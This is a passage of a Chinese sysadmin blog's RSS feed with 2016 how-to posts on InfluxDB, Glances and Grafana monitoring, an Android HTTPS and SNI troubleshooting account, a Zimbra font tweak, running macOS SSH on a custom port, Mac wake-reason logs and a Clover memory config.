&lt;/ul&gt;

&lt;p&gt;下面我们说一下具体的部署过程：&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;部署环境&#34;&gt;部署环境&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;监控对象：MAC机器&lt;/li&gt;
&lt;li&gt;监控平台：InfluxDB+Grafana，安装在一台CentOS机器上。(192.168.99.9)&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;部署过程&#34;&gt;部署过程&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;InfluxDB(192.168.99.9)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;安装&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CentOS 6.2&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#下载：
wget https://dl.influxdata.com/influxdb/releases/influxdb-0.13.0.x86_64.rpm
#安装：
sudo yum localinstall influxdb-0.13.0.x86_64.rpm
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;其他操作系统: &lt;a href=&#34;https://influxdata.com/downloads/#influxdb&#34;&gt;详见官方文档&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;配置和启动&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 运行influxdb
sudo /etc/init.d/influxdb start
        
# 创建数据库
curl &#39;http://192.168.8.172:8086/query?q=CREATE+DATABASE+&amp;quot;inorz_db_name&amp;quot;&#39;
    
# 查询已经创建的数据库
curl &#39;http://localhost:8086/query?q=SHOW+DATABASES&#39;
        
# 也可以直接登录WEB界面进行操作和查询
# 访问地址：http://192.168.99.9:8083
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Glances&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;安装: 在被监控机器上安装，这里我们要监控的机器是一台MAC机器。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install glances --user
pip install influxdb --user
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;配置和启动&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo vim /etc/glances.conf
# 输入以下内容后保存退出
host=192.168.99.9
port=8086
ser=root
password=root
db=inorz_db_name
        
# 运行
glances --export-influxdb -C /etc/glances.conf
        
# 如果需要后台运行，挂掉又可自动拉启。可以用supervisor来托管服务
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;如果客户端和监控端之间防火墙已经配置互通了的话，这回数据应该是可以正常发送到influxdb去了的。可以通过以下命令来查询有没有指标入库：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl &#39;http://192.168.99.9:8086/query?q=SHOW+MEASUREMENTS&amp;amp;db=glances&#39;
# 反馈来的是一串json
{&amp;quot;results&amp;quot;:[{&amp;quot;series&amp;quot;:[{&amp;quot;name&amp;quot;:&amp;quot;measurements&amp;quot;,&amp;quot;columns&amp;quot;:[&amp;quot;name&amp;quot;],&amp;quot;values&amp;quot;:[[&amp;quot;cpu&amp;quot;],[&amp;quot;diskio&amp;quot;],[&amp;quot;fs&amp;quot;],[&amp;quot;load&amp;quot;],[&amp;quot;mem&amp;quot;],[&amp;quot;memswap&amp;quot;],[&amp;quot;network&amp;quot;],[&amp;quot;percpu&amp;quot;],[&amp;quot;processcount&amp;quot;],[&amp;quot;system&amp;quot;]]}]}]}
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Grafana(192.168.99.9)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;安装&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CentOS 6.2&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 下载：
wget https://grafanarel.s3.amazonaws.com/builds/grafana-3.0.2-1463383025.linux-x64.tar.gz
# 解压并启动
tar xf grafana-3.0.2-1463383025.linux-x64.tar.gz
cd grafana-3.0.2-1463383025/bin/
./grafana-server
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;其他操作系统: &lt;a href=&#34;http://grafana.org/download/&#34;&gt;详见官方文档&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;配置&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;直接在浏览器上进行配置：&lt;a href=&#34;http://192.168.99.9:3000&#34;&gt;http://192.168.99.9:3000&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;默认账密为admin,admin&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;添加数据源
&lt;img src=&#34;http://inorz.net/images/grafana-add-data-influxdb.png&#34; alt=&#34;grafana-dd-data-influxdb&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;添加Graph
&lt;img src=&#34;http://inorz.net/images/grafana_add_graph.png&#34; alt=&#34;grafana_add_graph&#34; /&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;填入查询语句（可以到influxdb的WEB页面操作查询，语法和SQL差不多，非常简单）。这里我们填入查询复杂信息的语句。
&lt;img src=&#34;http://inorz.net/images/grafana_add_graph_edit.png&#34; alt=&#34;grafana_add_graph_edit&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;效果图
下面是我自己简单配置的一个监控图形，有兴趣的可以自己发挥。
&lt;img src=&#34;http://inorz.net/images/grafana_dashboards.png&#34; alt=&#34;grafana_dashboards&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;faq&#34;&gt;FAQ&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;连接不上数据库，访问页面超时。首先检查一下安装过程以及配置，启动时是否有报错，另外看防火墙是否配置正确。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;其他&#34;&gt;其他&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;以上为个人的一个安装和配置过程，如有不对，请多多指正。&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>记录一次android上https无法正常访问</title>
      <link>http://inorz.net/2016/04/13/notes-android_https_error/</link>
      <pubDate>Wed, 13 Apr 2016 00:55:48 +0000</pubDate>
      
      <guid>http://inorz.net/2016/04/13/notes-android_https_error/</guid>
      <description>&lt;p&gt;有同鞋反馈过来说，A域名通过Https去访问，完全无法建立连接。用B域名则没有任何问题。于是排除了代码这块的问题。
A域名和B域名，在浏览器上打开，则是完全没问题的。于是在小猜会不会是代码有问题。
然后就开始一系列的排查过程。
期间大神也过来帮忙一起排查。&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;排查过程&#34;&gt;排查过程&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在自己的Mac下用了以下命令去测试连接A.test.domain.com，发现请求异常。无法建议连接。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;openssl s_client -connect A.test.domain.com:443
openssl s_client -connect A.test.domain.com:443 -tls1
openssl s_client -connect A.test.domain.com:443 -ssl3
openssl s_client -connect A.test.domain.com:443 -debug
...
# 返回都是
CONNECTED(00000003)
write:errno=54
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;同样的命令，去请求B.test.domain.com，则没有任何问题。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;手机端请求异常的时候进行了抓包。发现连三次握手都没办法正常进行。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;开始对比两个域名之间的不同地方。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A域名和B域名的证书是在两个地方申请的，一个是沃通，一个是StartSSL

&lt;ul&gt;
&lt;li&gt;联系了沃通，对方技术反馈说通过&lt;a href=&#34;https://wosign.ssllabs.com/index.html&#34;&gt;【沃通提供的测试系统】&lt;/a&gt;，确定我们证书没有问题。包括证书链什么的都是正常。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;A域名和B域名的证书链不一样

&lt;ul&gt;
&lt;li&gt;尝试了在沃通官网上找对应的根证书追加到A域名证书里，也是无果。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;A域名和B域名的Nginx版本不一样

&lt;ul&gt;
&lt;li&gt;A机器用了openresty，B机用了最新的nginx&lt;/li&gt;
&lt;li&gt;编译参数部分不一样&lt;/li&gt;
&lt;li&gt;ldd nginx，发现两台机器也是一样的。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;A域名和B域名对应的机器不一样&lt;/li&gt;
&lt;li&gt;A域名和B域名长得不一样&amp;hellip;&lt;/li&gt;
&lt;li&gt;&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;开始思考人生&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;开始反过来测试：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;把A机的域名配置和证书拉到B机，重启nginx。用openssl命令连接，居然可以正常访问。排除证书问题。&lt;/li&gt;
&lt;li&gt;定位到可能是A机这边的问题。

&lt;ul&gt;
&lt;li&gt;A机yum重新安装nginx：不行。&lt;/li&gt;
&lt;li&gt;在A机重新编译nginx 1.4.4：不行。&lt;/li&gt;
&lt;li&gt;直接把B机的nginx拉过去用：不行。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;在A机上用以前旧的nginx新开了一个1443的端口，指定A的域名。测试，可以连接。

&lt;ul&gt;
&lt;li&gt;把旧的nginx还原之前旧的配置，发现又不能连接了。&lt;/li&gt;
&lt;li&gt;大神怀疑配置有问题。又开始了各种测试。&lt;/li&gt;
&lt;li&gt;最终发现是“有问题”的nginx下配置了多个ssl站点。&lt;/li&gt;
&lt;li&gt;把另外一些多配的ssl站点配置移走后，nginx reload后发现A站点的Https域名可以正常访问了。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;想到之前大神处理过SVN多ssl站点的问题。但最终是因为svn客户端1.6即之后的版本都默认支持&lt;a href=&#34;https://en.wikipedia.org/wiki/Server_Name_Indication&#34;&gt;SNI特性&lt;/a&gt;解决了。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;在自己电脑上和手机上用openssl命令去连接失败，本地的Openssl版本是0.9.8的，手机的应该同样是旧版本。不支持SNI特性。openssl 1.0之后才会默认支持SNI特性。所以会连接失败。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;解决方案&#34;&gt;解决方案&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;手机端升级openssl，明显不太现实。&lt;/li&gt;
&lt;li&gt;服务端这边只开启这一个域名为https，这样也不太现实。&lt;/li&gt;
&lt;li&gt;android这边修改代码去实现。因为A证书之前在手机浏览器上访问是正常的。

&lt;ul&gt;
&lt;li&gt;有两个相关的参考地址：

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://developer.android.com/training/articles/security-ssl.html&#34;&gt;http://developer.android.com/training/articles/security-ssl.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.dev001.net/post/67082904181/android-using-sni-and-tlsv12-with-apache&#34;&gt;http://blog.dev001.net/post/67082904181/android-using-sni-and-tlsv12-with-apache&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;后记&#34;&gt;后记&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;其实一开始沃通的技术发过来的测试站点上，有列出部分终端不能支持。并且也标识低版本不支持SNI。当时没仔细从这里入手，导致这里瞎测试了一段时间。&lt;/li&gt;
&lt;li&gt;配置https的域名，需要在配置配上TLSv1，目前很多旧的手机还是只支持到v1的。否则会遇到和我一样的问题。&lt;/li&gt;
&lt;li&gt;希望大家不要和我踩同样的坑&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>zimbra添加微软雅黑字体</title>
      <link>http://inorz.net/2016/04/11/zimbra-add-msyh/</link>
      <pubDate>Mon, 11 Apr 2016 23:20:48 +0000</pubDate>
      
      <guid>http://inorz.net/2016/04/11/zimbra-add-msyh/</guid>
      <description>&lt;p&gt;很多同鞋都习惯了在zimbra上面使用雅黑字体来写邮件
最近把zimbra从8.0.5升级到了8.6.0后，没留意又覆盖回去了。
在这里做个记录&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;配置原理&#34;&gt;配置原理&lt;/h2&gt;

&lt;p&gt;ZWC控制资源文件（properties文件）来实现国际化下的字体列表。在JAVA架构的系统下，通过资源文件来实现国际化是常用的技术，ZWC也不例外。&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;经过搜索，ZWC中控制国际化下的字体列表的资源文件是:
&lt;code&gt;zimbrahome/jetty/webapps/zimbra/WEB-INF/classes/messages/AjxMsg.properties&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;按照Java的规则，中文简体对应的资源文件应该是:
&lt;code&gt;zimbrahome/jetty/webapps/zimbra/WEB-INF/classes/messages/AjxMsg_zh_CN.properties&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;配置文件的写法大概是：

&lt;ul&gt;
&lt;li&gt;可以向列表中加入任意多的字体数量。&lt;/li&gt;
&lt;li&gt;要添加一个新的字体，首先要添加一个键名类似fontFamilyBase{number}.display的条目和一个键名类似fontFamilyBase{number}.css的条目，分别表示字体显示名称和内部名称。&lt;/li&gt;
&lt;li&gt;对于国际化环境而言，则应使用键名分别为fontFamilyIntl{number}.display和fontFamilyIntl{number}.css的条目。&lt;/li&gt;
&lt;li&gt;这里的{number}是一个阿拉伯数字，从1开始，新建时应比当前最大的数字大1。要结束这些列表，将最后一个条目的值设为“###”。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;配置过程&#34;&gt;配置过程&lt;/h2&gt;

&lt;p&gt;上面说了一通，其实修改方法比较简单，就修改两个地方即可：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;修改配置文件&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cp zimbrahome/jetty/webapps/zimbra/WEB-INF/classes/messages/AjxMsg_zh_CN.properties /data/backup/
vim zimbrahome/jetty/webapps/zimbra/WEB-INF/classes/messages/AjxMsg_zh_CN.properties
# 找到fontFamilyIntl列表中第一个值为“###”的条目。根据不同的软件版本，那个{number}可能不同，在7.0上是4（即前面有3个字体）。
# 修改fontFamilyIntl4值。可按情况修改
# 微软雅黑转换为Unicode后是 \u5fae\u8f6f\u96c5\u9ed1
fontFamilyIntl4.display = \u5fae\u8f6f\u96c5\u9ed1
fontFamilyIntl4.css = \u5fae\u8f6f\u96c5\u9ed1, msyh
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;保存文件后重启Zimbra服务。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;zmcontrol restart
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;注意事项&#34;&gt;注意事项&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;上面修改后的字体，需要客户端本地有对应的字体才能够正常使用。&lt;/li&gt;
&lt;li&gt;windows平台: win7之后基本都自带微软雅黑了，应该不成问题。&lt;/li&gt;
&lt;li&gt;MAC平台: mac用户的话就需要自己安装微软雅黑了。不过相信一般mac用户都用自带的邮件app的多些。也不是问题。&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>MAC开机启动ssh，并指定端口</title>
      <link>http://inorz.net/2016/04/10/mac-startup-ssh/</link>
      <pubDate>Sun, 10 Apr 2016 12:35:48 +0000</pubDate>
      
      <guid>http://inorz.net/2016/04/10/mac-startup-ssh/</guid>
      <description>&lt;p&gt;MAC开机启用SSH，比较简单。
偏好设置-共享-选中远程登录就可以了。&lt;/p&gt;

&lt;p&gt;但是想要指定端口去启用就比较恶心了。
网上搜了一圈后，可以按以下的方式去指定端口配置。&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;系统环境&#34;&gt;【系统环境】&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;OS: 10.11.4&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;配置过程&#34;&gt;【配置过程】&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;因为10.11开启了SIP，所以不能直接修改/System/下的文件。&lt;/li&gt;

&lt;li&gt;&lt;p&gt;把下面配置文件配置到用户级目录下。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir -p ~/Library/LaunchDaemons/
sudo cp /System/Library/LaunchDaemons/ssh.plist ~/Library/LaunchDaemons/ssh.plist
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;修改配置文件&lt;code&gt;vi ~/Library/LaunchDaemons/ssh.plist&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &amp;quot;-//Apple//DTD PLIST 1.0//EN&amp;quot; &amp;quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;quot;&amp;gt;
&amp;lt;plist version=&amp;quot;1.0&amp;quot;&amp;gt;
&amp;lt;dict&amp;gt;
    &amp;lt;key&amp;gt;Enabled&amp;lt;/key&amp;gt;
    &amp;lt;true/&amp;gt;
    &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;com.openssh.sshd.xxxxx（随便起个名字，目的是不被共享设置里面的开关影响到）&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;Program&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;/usr/libexec/sshd-keygen-wrapper&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
    &amp;lt;array&amp;gt;
        &amp;lt;string&amp;gt;/usr/sbin/sshd&amp;lt;/string&amp;gt;
        &amp;lt;string&amp;gt;-i&amp;lt;/string&amp;gt;
    &amp;lt;/array&amp;gt;
    &amp;lt;key&amp;gt;Sockets&amp;lt;/key&amp;gt;
    &amp;lt;dict&amp;gt;
        &amp;lt;key&amp;gt;Listeners&amp;lt;/key&amp;gt;
        &amp;lt;dict&amp;gt;
            &amp;lt;key&amp;gt;SockServiceName&amp;lt;/key&amp;gt;
            &amp;lt;string&amp;gt;SSH端口&amp;lt;/string&amp;gt;
            &amp;lt;key&amp;gt;Bonjour&amp;lt;/key&amp;gt;
            &amp;lt;array&amp;gt;
                &amp;lt;string&amp;gt;ssh&amp;lt;/string&amp;gt;
                &amp;lt;string&amp;gt;sftp-ssh&amp;lt;/string&amp;gt;
            &amp;lt;/array&amp;gt;
        &amp;lt;/dict&amp;gt;
    &amp;lt;/dict&amp;gt;
    &amp;lt;key&amp;gt;inetdCompatibility&amp;lt;/key&amp;gt;
    &amp;lt;dict&amp;gt;
        &amp;lt;key&amp;gt;Wait&amp;lt;/key&amp;gt;
        &amp;lt;false/&amp;gt;
        &amp;lt;key&amp;gt;Instances&amp;lt;/key&amp;gt;
        &amp;lt;integer&amp;gt;42&amp;lt;/integer&amp;gt;
    &amp;lt;/dict&amp;gt;
    &amp;lt;key&amp;gt;StandardErrorPath&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;/dev/null&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;SHAuthorizationRight&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;system.preferences&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;POSIXSpawnType&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;Interactive&amp;lt;/string&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;重新载入配置&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo launchctl unload ~/Library/LaunchDaemons/ssh.plist
sudo launchctl load -w ~/Library/LaunchDaemons/ssh.plist
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;可以用telnet或是lsof来检查一下修改并启用的端口有没有开起来。或是直接ssh连一下测试即可。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>MAC查看休眠日志</title>
      <link>http://inorz.net/2016/03/24/mac-sleep/</link>
      <pubDate>Thu, 24 Mar 2016 11:15:48 +0000</pubDate>
      
      <guid>http://inorz.net/2016/03/24/mac-sleep/</guid>
      <description>&lt;ol&gt;
&lt;li&gt;有同鞋反馈说MAC开发机经常无故连不上，失去响应。&lt;/li&gt;
&lt;li&gt;每次我这边远程桌面一连，那边就反馈登录正常了。于是怀疑是系统自动休眠了。&lt;/li&gt;
&lt;li&gt;通过下面操作可查到系统是否休眠了。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;执行下面这条命令&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;syslog |grep -Ei &amp;quot;Wake reason|sleep&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;执行了上面这条命令，可以看到“Wake reason=”旁边的一些代码(红色字),那么这些代码表示什么意思呢？&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;OHC&lt;/code&gt;：表示开放式主机控制器（Open Host Controller），它通常和USB或火线有关，如果你看到的是OHC1或OHC2则基本上是USB外接键盘或鼠标导致唤醒了您的Mac。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;EHC&lt;/code&gt;：表示增强的主机控制器（Enhanced Host Controller），这是另一种USB接口，但也可以是无线或蓝牙设备，因为它们均隶属于Mac的USB总线。（新版系统好像全部由XHC取代OHC和EHC了，不再细分，求证实）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;USB&lt;/code&gt;：一个USB设备唤醒了Mac。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LID0&lt;/code&gt;：字面意思是MB或MBP的盖子，代表您打开盖子使机器唤醒了。（实际上在新版系统，开盖唤醒对应的代码应该是EC.LidOpen (User)）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PWRB&lt;/code&gt;：表示电源按钮（Power Button）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RTC&lt;/code&gt;：实时时钟（Real Time Clock Alarm），一般是由会唤醒机器的服务导致的，诸如“节能器”控制台（位于系统偏好设置中）设定的定时睡眠或唤醒。也可以由已启用的设定、用户的应用程序、备份任务以及其它计划任务触发。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;EC.ACAttach (Maintenance)/EC.ACDetach (Maintenance)&lt;/code&gt;：连接/断开电源适配器（维护），会导致短暂的唤醒（就几秒，随后继续睡回笼觉，无需在意）。当外接电源发生变化时，系统短暂唤醒一下，然后调整电源管理方案（如是否启用Power Nap，各USB设备、Thunderbolt设备、蓝牙设备、无线网络、Airport、netbios等工作方式），调整完毕后继续睡眠。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;你可能会看到其它代码（诸如&lt;code&gt;PCI&lt;/code&gt;、&lt;code&gt;GEGE&lt;/code&gt;等），但上述代码是大多数人会在系统日志里遇到的。一旦你看到这些代码，你可以缩小查找范围。&lt;/p&gt;

&lt;p&gt;PS：最后查到果然是因为系统自动休眠了，改了一下休眠设置。解决！&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    
    <item>
      <title>黑苹果Clover无法引导安装镜像，反复重启</title>
      <link>http://inorz.net/2016/03/24/black-apple-clover-error/</link>
      <pubDate>Thu, 24 Mar 2016 11:15:48 +0000</pubDate>
      
      <guid>http://inorz.net/2016/03/24/black-apple-clover-error/</guid>
      <description>&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;最近准备测试一下黑苹果用来做IOS调试机器的可行性，于是在一台主机上安装了黑苹果，然后在安装过程中，遇到Clover无法引导安装镜像，反复重启。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;排查过程&#34;&gt;排查过程&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;一开始以为是主板或BIOS不行，反复换了不少镜像，包括各种懒人版。&lt;/li&gt;
&lt;li&gt;然后发现所有镜像均是同一症状。反复重启。&lt;/li&gt;
&lt;li&gt;开始怀疑和思考人生&lt;/li&gt;

&lt;li&gt;&lt;p&gt;最后翻了一下Clover的配置文件和官方文档，发现是可以配置内存位置的。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;key&amp;gt;Memory&amp;lt;/key&amp;gt;
&amp;lt;dict&amp;gt;
  &amp;lt;key&amp;gt;Channels&amp;lt;/key&amp;gt;
  &amp;lt;integer&amp;gt;2&amp;lt;/integer&amp;gt; OR &amp;lt;string&amp;gt;1&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;SlotCount&amp;lt;/key&amp;gt;
  &amp;lt;integer&amp;gt;24&amp;lt;/integer&amp;gt; OR &amp;lt;string&amp;gt;4&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;Modules&amp;lt;/key&amp;gt;
  &amp;lt;array&amp;gt;
    &amp;lt;dict&amp;gt;
      &amp;lt;key&amp;gt;Slot&amp;lt;/key&amp;gt;
      &amp;lt;integer&amp;gt;0&amp;lt;/integer&amp;gt; OR &amp;lt;string&amp;gt;5&amp;lt;/string&amp;gt;
      &amp;lt;key&amp;gt;Size&amp;lt;/key&amp;gt;
      &amp;lt;integer&amp;gt;2048&amp;lt;/integer&amp;gt; OR &amp;lt;string&amp;gt;4096&amp;lt;/string&amp;gt;
      &amp;lt;key&amp;gt;Frequency&amp;lt;/key&amp;gt;
      &amp;lt;integer&amp;gt;1600&amp;lt;/integer&amp;gt; OR &amp;lt;string&amp;gt;1333&amp;lt;/string&amp;gt;
      &amp;lt;key&amp;gt;Vendor&amp;lt;/key&amp;gt;
      &amp;lt;string&amp;gt;Some Company&amp;lt;/string&amp;gt;
      &amp;lt;key&amp;gt;Part&amp;lt;/key&amp;gt;
      &amp;lt;string&amp;gt;123456ABCDEF&amp;lt;/string&amp;gt;
      &amp;lt;key&amp;gt;Serial&amp;lt;/key&amp;gt;
      &amp;lt;string&amp;gt;ABCDEF123456&amp;lt;/string&amp;gt;
      &amp;lt;key&amp;gt;Type&amp;lt;/key&amp;gt;
      &amp;lt;string&amp;gt;DDR/DDR2/DDR3&amp;lt;/string&amp;gt;
   &amp;lt;/dict&amp;gt;
  &amp;lt;/array&amp;gt;
&amp;lt;/dict&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Inject custom memory module tables into SMBIOS if original SPD and SMBIOS provide incorrect or incomplete information.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Channels&lt;/code&gt; - Number of hardware channels supported by your memory chipset, usually two.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SlotCount&lt;/code&gt; - Total count of memory slots in your system. Max 24 (for now).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Modules&lt;/code&gt; - An array of INSTALLED modules, if your slot is empty don&amp;rsquo;t include an entry for it.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;For each module:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Slot&lt;/code&gt; - Physical slot location in which the module is installed.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Size&lt;/code&gt; - Size of the module in megabytes.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Frequency&lt;/code&gt; - Speed of the module in megahertz.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Vendor&lt;/code&gt; - Memory manufacturer name&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Part&lt;/code&gt; - The part number identifier.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Serial&lt;/code&gt; - The module&amp;rsquo;s serial number.&lt;/li&gt;
